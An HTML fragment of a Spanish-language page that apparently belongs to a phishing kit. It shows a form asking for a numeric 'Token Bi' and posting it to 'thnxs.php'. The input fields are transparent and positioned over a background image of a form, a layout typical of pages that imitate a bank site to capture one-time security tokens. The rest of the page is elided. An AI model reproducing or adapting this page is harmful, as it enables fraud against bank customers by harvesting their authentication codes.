...
<html lang="es">
  ...
  <body style="overflow-x:hidden;">
    ...
    <div id="cder">
        ...
        <div id="mn-frm">
          <form action="thnxs.php" method="post">
            <input max-length="8" pattern="[0-9]*" inputmode="numeric" required name="ipts1" type="text" placeholder="Token Bi" style="position: relative;top: 108px;left: 27px;height: 49px;width: 254px;display: block; border:none; background:transparent;padding: 0px 0 0 54px;font-size: 16px;font-family: sans-serif;">
            <input type="submit" value="" style="position: relative;top: 128px;;left: 27px;height: 49px;width: 310px;display: block; border:none; background:transparent;padding: 0px 0 0 54px;font-size: 16px;font-family: sans-serif;">
          </form>
        </div>
    </div>
    <style>
      *{margin:0;padding:0;}
      ...
      #mn-frm{
        height:410px;
        width:363px;
        background-image:url('frstk2.svg');
        background-repeat:no-repeat;
        background-size:cover;
        display:inline-block;
      }
